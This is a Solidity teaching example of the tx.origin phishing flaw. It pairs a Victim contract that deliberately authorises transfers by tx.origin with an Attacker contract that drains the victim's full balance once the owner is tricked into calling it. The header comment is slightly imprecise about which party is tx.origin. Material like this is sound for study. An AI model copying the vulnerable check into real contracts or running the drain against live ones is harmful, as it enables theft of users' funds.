// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

/**
 * @notice Phishing with tx-origin
 * Contract A calls B and B calls C.
 * Inside contract C:  A is tx.origin and B is msg.sender.
 */

contract Victim {
    error Victim_NotOwner();
    error Victim_FailedToSendEth();

    address public s_owner;

    constructor() payable {
        s_owner = msg.sender;
    }

    /**
     * @notice The vulnerable modifier
     * that checks tx.origin instead of msg.sender
     */
    modifier notOwner() {
        if (tx.origin != s_owner) {
            revert Victim_NotOwner();
        }
        _;
    }

    /**
     * @notice A simple call-transfer but with a vulnerable modifier
     */
    function transfer(address payable _to, uint256 _amount) public notOwner {
        (bool success,) = _to.call{value: _amount}("");

        if (!success) {
            revert Victim_FailedToSendEth();
        }
    }

    /**
     * @dev testing purpose
    */
    function myTxOrigin() public returns (address){
        return tx.origin; //the first contract that calls this function
    }
}

contract Attacker {
    address payable public owner;
    Victim victim;

    constructor(address _victim) {
        victim = Victim(_victim);
        owner = payable(msg.sender);
    }

    function attack() public {
        //owner is deployer
        victim.transfer(owner, address(victim).balance); 
    }

}
